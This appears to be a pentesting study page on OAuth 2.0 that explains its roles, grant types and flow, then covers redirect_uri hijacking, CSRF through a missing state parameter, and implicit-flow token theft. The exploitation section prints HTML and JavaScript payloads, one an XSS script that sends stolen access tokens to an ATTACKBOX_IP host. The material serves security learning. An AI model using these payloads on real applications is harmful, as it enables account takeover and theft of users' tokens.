# OAuth Security

OAuth is ...

<details>

<summary>Key Concepts</summary>

## Resource Owner

The resource owner is the person or system that controls certain data and can authorize an application to access that data on their behalf. This concept is fundamental as it centres around user consent and control.



## Client

The client can be a **mobile app** or a **server-side web application**. It acts as an intermediary, requesting access to resources and performing actions as permitted by the resource owner



## Authorization Server

The authorization server is responsible for issuing access tokens to the client after successfully authenticating the resource owner and obtaining their authorization. The authorization server plays a crucial role in the OAuth process by ensuring the client is granted permission only after legitimate user authentication and consent.



## Resource Server

The server hosting the protected resources can **accept and respond** to protected resource requests using access tokens. This server ensures that only authenticated and authorized clients can access or manipulate the resource owner's data



## Authorization Grant

The client uses a credential representing the resource owner's authorization (to access their protected resources) to obtain an access token. The primary grant types are `Authorization Code`, `Implicit`, `Resource Owner Password Credentials`, and `Client Credentials`.



## Access Token

A credential that the client can use to access protected resources on behalf of the resource owner. It has a limited lifespan and scope. Access tokens are essential for maintaining secure and protected communication between the client and resource server without repeatedly asking the resource owner for credentials.



## Refresh Token

A credential that the client can use to obtain a new access token without requiring the resource owner to re-authenticate. Refresh tokens are typically long-lived and provide a way to maintain user sessions without frequent login interruptions.



## Redirect URI

The URI to which the authorization server will redirect the resource owner’s user-agent after the grant or denial of the authorization. It checks if the client for which the authorization response has been requested is correct



## Scope

Scopes are a mechanism for limiting an application's access to a user's account. They allow the client to specify the level of access needed and the authorization server to inform the user what access levels the application is requesting. Scopes help enforce the `principle of least privilege`&#x20;



## State Parameter

An optional parameter maintains the state between the client and the authorization server. It can help prevent CSRF attacks by ensuring the response matches the client's request. The state parameter is a crucial part of securing the OAuth flow



## Token & Authorization Endpoint

The authorization server's endpoint is where the client exchanges the authorization grant (or refresh token) for an access token. In contrast, the authorization endpoint is where the resource owner is authenticated and authorizes the client to access the protected resources.



</details>

<details>

<summary>OAuth Grant Types</summary>

## Authorization Code Grant

The Authorization Code grant is the most commonly used OAuth 2.0 flow suited for server-side applications (PHP, JAVA, .NET etc). In this flow, the client redirects the user to the authorization server, where the user authenticates and grants authorization. The authorization server then redirects the user to the client **with an authorization code**. The client **exchanges the authorization code for an access token** by requesting the authorization server's token endpoint.&#x20;

This grant type is known for its enhanced security, as the authorization code is exchanged for an access token server-to-server, meaning the access token is not exposed to the user agent (e.g., browser), thus reducing the risk of token leakage. It also supports using refresh tokens to maintain long-term access without repeated user authentication.



## Implicit Grant

The Implicit grant is primarily designed for mobile and web applications where clients **cannot securely store secrets**. It directly issues the access token to the client **without requiring an authorization code exchange**. In this flow, the client redirects the user to the authorization server. After the user authenticates and grants authorization, the authorization server returns an access token in the URL fragment.

This grant type is simplified and suitable for clients who cannot securely store client secrets. It is faster as it involves fewer steps than the authorization code grant. However, it is less secure as the access token is exposed to the user agent and can be logged in the browser history. It also does **not support refresh tokens**.



## Resource Owner Password Credentials Grant

The Resource Owner Password Credentials grant is used when the client is highly trusted by the resource owner, such as first-party applications. The client collects the user’s credentials (username and password) directly and exchanges them for an access token.

In this flow, the user provides their credentials directly to the client. The client then sends the credentials to the authorization server, which verifies the credentials and issues an access token. This grant type is direct, requiring fewer interactions, making it suitable for highly trusted applications where the user is confident in providing their credentials. However, it is less secure because it involves sharing credentials directly with the client and is unsuitable for third-party applications.

## Client Credentials Grant

The Client Credentials grant is used for server-to-server interactions without user involvement. The client uses his credentials to authenticate with the authorization server and obtain an access token. In this flow, the client authenticates with the authorization server using its client credentials (client ID and secret), and the authorization server issues an access token directly to the client

This grant type is suitable for backend services and server-to-server communication as it does not involve user credentials, thus reducing security risks related to user data exposure.



</details>

#### How OAuth Flow Works

The OAuth 2.0 flow begins when a user (Resource Owner) interacts with a client application (Client) and requests access to a specific resource. The client redirects the user to an authorization server, where the user is prompted to log in and grant access. If the user consents, the authorization server issues an authorization code, which the client can exchange for an access token. This access token allows the client to access the resource server and retrieve the requested resource on behalf of the user.

When the user click on the "Login with OAuth" button the client will redirect the user in a page like this:

{% code overflow="wrap" %}
```
http://auth_server.com:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//client.site.com%3A8000/oauthdemo/callback
```
{% endcode %}

The URL parameters used are the follow:

* `response_type=code`: This indicates that `Authorization Server` is expecting an authorization code in return.
* `state`: A CSRF token to ensure that the request and response are part of the same transaction.
* `client_id`: A public identifier for the client application, uniquely identifying.
* `redirect_uri`: The URL where the authorization server will send The User after he grants permission. This must match one of the pre-registered redirect URIs for the client application.
* `scope`: Specifies the level of access requested, such as viewing account data.

<details>

<summary>Authentication &#x26; Authorization</summary>

When a User reaches the authorization server, he is prompted to log in using his credentials. This step ensures that the server can verify his identity. After successfully logging in, the authorization server asks User if he agrees to grant the OAuth Provider (ex Google, Apple, ...) access to his details. This consent step is crucial as it gives User transparency and control over which applications can access his data.

The process typically involves:

* User Login: User enters his username and password on the authorization server's login page.
* Consent Prompt: After authentication, the authorization server presents User with a consent screen detailing what the OAuth Provider requests access to (e.g., viewing his account details). User must then decide whether to grant or deny these permissions.

This dual-step process ensures that Tom's identity is authenticated and his explicit consent is obtained before any access is granted, maintaining security and user control over personal data.

</details>

<details>

<summary>Authorization Response</summary>

If User agrees to grant access, the authorization server generates an authorization code . The server then redirects the User to the client website using the specified `redirect_uri`. The redirection includes the authorization code and the original state parameter to ensure the integrity of the flow.

The authorization server responds with the following:

* `code`: `OAuth Provider` will use the authorisation code to request an access token.
* `state`: The CSRF token previously sent by `OAuth Provider` to validate the response.

An example authorization response would be `https://client.website.com:8000/callback?code=AuthCode123456&state=xyzSecure123`.

This step ensures the authorization process is secure and the response is linked to the client website's initial request. The authorization code is a temporary token that will be used in the next step to obtain an access token, allowing `OAuth Provider` to access User's profile details.

</details>

<details>

<summary>Token Request</summary>

The client website exchanges the authorization code for an access token by requesting the authorization server’s token endpoint through a POST request with the following parameters:

* `grant_type`: type of grant being used; usually, it's set as `code` to specify authorization code as the grant type.
* `code`: The authorization code received from the authorization server.
* `redirect_uri`: This must match the original redirect URI provided in the authorization request.
* `client_id and client_secret`: Credentials for authenticating the client application.

The client app securely exchanges the authorization code for an access token by sending this request. The authorization server will verify the information provided, ensuring the request is valid and originates from the client requesting the authorization code. If everything is correct, the authorization server will respond with the access token, allowing the client website to proceed with accessing User's profile details.

</details>

<details>

<summary>Token Response</summary>

The authorization server authenticates the client website and validates the authorization code. Upon successful validation, the server responds with an `Access Token` and, optionally, a `Refresh Token`.

The authorization server's response includes the following:

* `access_token`: Token that will be used to access User's details.
* `token_type`: Typically "Bearer".
* `expires_in`: The duration in seconds for which the access token is valid.
* `refresh_token (optional)`: A token used to obtain new access tokens without requiring the user to log in again.

With the access token, the Client website can now authenticate requests to the resource server to access User's profile details. The optional refresh token can be used to request a new access token once the current one expires, providing a seamless user experience by avoiding the need for User to log in repeatedly.

The Client website has completed the OAuth 2.0 authorization workflow with the access token. This token is a credential allowing the app to access protected resources on User's behalf. Now, the Client website can make authenticated requests to the resource server to retrieve User's profile. Each request to the resource server includes the access token in the authorization header, ensuring that the server recognizes and permits the access.

</details>



## Exploiting OAuth

### Stealing OAuth Token

Tokens are essential in OAuth 2.0, serving as digital keys for access to protected resources. They are issued by the authorization server and sent to clients via the `redirect_uri`. Secure handling of `redirect_uri` is vital to prevent token hijacking by attackers.

The `redirect_uri` parameter is specified during the OAuth flow to direct where the authorization server should send the token after authorization. This URI must be pre-registered in the application settings to prevent open redirect vulnerabilities. During the OAuth process, the server checks that the provided `redirect_uri` matches one of the registered URIs.

#### Exploitation

An insecure `redirect_uri` can lead to severe security issues. If attackers gain control over any domain or URI listed in the `redirect_uri`, they can manipulate the flow to intercept tokens.

* Consider an OAuth application with the following registered redirect URIs
* **Attacker's Strategy**: If an attacker gains control over `dev.client.com`, they can exploit the OAuth flow. By setting the `redirect_uri` to `http://dev.client.com/callback`, the authorization server will send the token to this controlled domain.
* **Crafted Attack:** The attacker initiates an OAuth flow and ensures the `redirect_uri` points to their controlled domain. After the user authorizes the application, the token is sent to `http://dev.client.com/callback`. The attacker can now capture this token and use it to access protected resources.\


Malicious HTLM Payload that can be redirect a user to hijack the Oauth `redirect_uri` :

{% code title="payload_redirect.htlm" overflow="wrap" %}
```html
<form action="http://oauth_provider.com:8000/oauthdemo/oauth_login/" method="get">
    <input type="hidden" name="redirect_uri" value="http://dev.client.com:8002/malicious_redirect.html">
    <input type="submit" value="Hijack OAuth">
</form>
```
{% endcode %}

HTML payload that intercept the authorization code from the URL:

```html
<script>
    // Extract the authorization code from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    document.getElementById('auth_code').innerText = code;
    console.log("Intercepted Authorization Code:", code);
    // code to save the acquired code in database/file etc
</script>
```

{% hint style="info" %}
Since the attacker has complete control over the subdomain, once he redirects a victim to the attacker-controlled domain, he will save the credentials in a database/file, etc., for later usage. Moreover, the redirection from redirect\_uri to the original URL would be so quick that the victim would have no idea that his authorization code has been hijacked.
{% endhint %}

The attacker can send User the link ([http://dev.client.com:8002/payload\_redirect.htlm](oauth-security.md#key-concepts)) through social engineering tactics or a CSRF attack. The victim, unsuspecting of the malicious intent, clicks on the link, which takes them to the URL `dev.client.com:8002/payload_redirect.htlm`.

#### Post exploitation actions

From the attacker’s machine, they can utilize the intercepted authorization code to call the `/callback` endpoint and exchange it for a valid access token. In an OAuth flow, as we saw earlier, the `/callback` endpoint is always available, accepting the code parameter and returning an access token. With this token, the attacker gains unauthorized access to the user's protected resources. To get the access token, visit the URL [http://client.com:8000/oauthdemo/callback/?code=xxxxx](http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx) and replace the `code` parameter with the acquired authorization code.



### CSRF in OAuth

The `state` parameter in OAuth 2.0 protects against CSRF attacks, where attackers trick users into unwanted actions on authenticated web applications. It preserves the authorization process integrity, preventing unauthorized access to sensitive resources by maintaining the OAuth flow.

#### Vulneraebility of Weak or missing State Parameter

The `state` parameter in OAuth is a string included by the client in the authorization request to prevent CSRF attacks. It is returned by the server along with the authorization code, and the client verifies it matches the original to ensure request integrity. If the `state` is missing or predictable, attackers can exploit this by redirecting users to a malicious URI.

#### Detection

When we click to a Redirect url of a OAuth Provider we have to exam the URL:

{% code overflow="wrap" %}
```
http://oauth_provider.com:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Foauth_provider.com%2Fcsrf%2Fcallbackcsrf.php
```
{% endcode %}

As a pentester, you will notice that the authorization URL is **missing** the `state` parameter, suggesting we can use the same request for a CSRF attack. Here, you don't need to sync your actual account. \
Let's exploit this vulnerability to attach the attacker's third-party account to a victim account.

#### Exploitation

As a pentester, you will notice that the authorization URL is missing the `state` parameter, suggesting we can use the same request for a CSRF attack. Here, you don't need to sync your actual account. \
Let's exploit this vulnerability to attach the attacker's third-party account to a victim account.

To prepare the payload, the attacker must get his authorization code. This can be done by intercepting the authorization process using a tool like Burp Suite

* Once the attacker has obtained the authorization code, he can prepare the CSRF payload. Suppose the attacker sends an email to the victim with a link like `http://client.com:8080/csrf/callbackcsrf.php?code=ATTACKERS_CODE`.
* After receiving the email, if the victim clicks on the link or executes it in his browser (where `xxx` is the attacker's authorization code), the attacker's `OAuth Provider` (ex Google, Github, ect) OAuth account will be linked to the victim's account. This effectively transfers all the contacts from the victim's account to the attacker's.



### Implicit Grant Flow

In the implicit grant flow, tokens are directly returned to the client via the browser without requiring an intermediary authorization code. This flow is primarily used by single-page applications and is designed for public clients who cannot securely store client secrets. However, this flow has inherent vulnerabilities:

* **Exposing Access Token in URL**: The application redirects the user to the OAuth authorization endpoint, which returns the access token in the URL fragment. Any script running on the page can easily access this fragment.
* **Inadequate Validation of Redirect URIs**: The OAuth server does not adequately validate the redirect URIs, allowing potential attackers to manipulate the redirection endpoint.
* **No HTTPS Implementation**: The application does not enforce HTTPS, which can lead to token interception through man-in-the-middle attacks.
* **Improper Handling of Access Tokens**: The application stores the access token insecurely, possibly in `localStorage` or `sessionStorage`, making it vulnerable to XSS attacks.

XSS Payload to steal the access\_token from URL parameter:

```javascript
<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
    return res;
  }, {});
  var accessToken = result.access_token;
    var img = new Image();
    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```



### Insufficient Token Expiry

Access tokens with long or infinite lifetimes pose a significant security risk. If an attacker obtains such a token, they can access protected resources indefinitely. Implementing short-lived access and refresh tokens helps mitigate this risk by limiting the window of opportunity for attackers.

### Replay Attacks

Replay attacks involve capturing valid tokens and reusing them to gain unauthorized access. Attackers can exploit tokens multiple times without mechanisms to detect and prevent token reuse. Implementing `nonce` values and `timestamp` checks can help mitigate replay attacks by ensuring each token is used only once.

### Insecure Storage of Tokens

Storing access tokens and refresh tokens insecurely (e.g., in local storage or unencrypted files) can lead to token theft and unauthorized access. Using secure storage mechanisms, such as secure cookies or encrypted databases, can protect tokens from being accessed by malicious actors.
